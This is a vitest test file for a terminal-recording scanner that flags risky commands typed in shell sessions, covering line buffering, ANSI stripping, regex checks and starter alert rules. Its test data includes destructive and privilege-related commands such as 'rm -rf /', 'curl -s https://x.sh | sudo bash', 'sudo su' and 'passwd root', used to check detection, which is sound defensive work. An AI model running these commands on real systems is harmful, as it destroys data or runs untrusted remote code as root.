import { describe, expect, it } from "vitest";
import {
  InputLines,
  OutputLines,
  RecordingScanner,
  STARTER_RULES,
  checkPattern,
  stripAnsi,
  type Rule,
} from "../../src/backend/rules";

const rule = (overrides: Partial<Rule> = {}): Rule => ({
  id: 1,
  name: "Root",
  pattern: "sudo su",
  regex: false,
  target: "input",
  hosts: "all",
  severity: "warning",
  action: "alert",
  enabled: true,
  ...overrides,
});

const line = (t: number, type: string, data: string) =>
  `${JSON.stringify([t, type, data])}\n`;

describe("input lines", () => {
  it("handles backspace, Ctrl+C and escape keys", () => {
    const input = new InputLines();
    expect(input.push("sudo sx\x7fu\r")).toEqual(["sudo su"]);
    expect(input.push("rm -rf /\x03ls\r")).toEqual(["ls"]);
    expect(input.push("\x1b[Aecho hi\n")).toEqual(["echo hi"]);
  });
});

describe("output lines", () => {
  it("joins partial lines and strips colors", () => {
    const output = new OutputLines();
    expect(output.push("\x1b[31mERR")).toEqual([]);
    expect(output.push("OR\x1b[0m\r\nnext")).toEqual(["ERROR"]);
    expect(stripAnsi("\x1b]0;title\x07ok")).toBe("ok");
  });
});

describe("recording scanner", () => {
  it("matches typed commands across chunks", () => {
    const scanner = new RecordingScanner([rule()]);
    const chunk = ["s", "u", "d", "o", " ", "s", "u", "\r"]
      .map((key) => line(2, "i", key))
      .join("");
    const half = Math.floor(chunk.length / 2);
    expect(scanner.scan('{"version":2}\n' + chunk.slice(0, half))).toEqual([]);
    expect(scanner.scan(chunk.slice(half))).toMatchObject([
      { ruleId: 1, text: "sudo su", t: 2 },
    ]);
  });

  it("matches output rules with a regex and skips disabled ones", () => {
    const scanner = new RecordingScanner([
      rule({
        id: 2,
        target: "output",
        regex: true,
        pattern: "permission denied",
      }),
      rule({ id: 3, enabled: false, pattern: "anything" }),
    ]);
    expect(scanner.scan(line(1, "o", "Permission denied\r\n"))).toMatchObject([
      { ruleId: 2 },
    ]);
    expect(scanner.scan(line(1, "i", "anything\r"))).toEqual([]);
  });

  it("is empty with no enabled rules", () => {
    expect(new RecordingScanner([rule({ enabled: false })]).empty).toBe(true);
  });
});

describe("patterns", () => {
  it("refuses nested repeats, bad syntax and long patterns", () => {
    expect(() => checkPattern("(a+)+", true)).toThrow(/complex/);
    expect(() => checkPattern("(", true)).toThrow(/valid/);
    expect(() => checkPattern("x".repeat(301), false)).toThrow(/long/);
    expect(() => checkPattern("  ", false)).toThrow(/empty/);
    expect(() => checkPattern("(", false)).not.toThrow();
  });

  it("ships starter rules that are all usable", () => {
    for (const starter of STARTER_RULES) {
      expect(() => checkPattern(starter.pattern, starter.regex)).not.toThrow();
    }
    const scanner = new RecordingScanner(
      STARTER_RULES.map((starter, index) => ({
        ...starter,
        id: index + 1,
        enabled: true,
      })),
    );
    const typed = (text: string) => line(0, "i", `${text}\r`);
    expect(scanner.scan(typed("rm -rf /"))).toHaveLength(1);
    expect(scanner.scan(typed("rm -rf /tmp/x"))).toHaveLength(0);
    expect(
      scanner.scan(typed("curl -s https://x.sh | sudo bash")),
    ).toHaveLength(1);
    expect(scanner.scan(typed("passwd root"))).toHaveLength(1);
  });
});
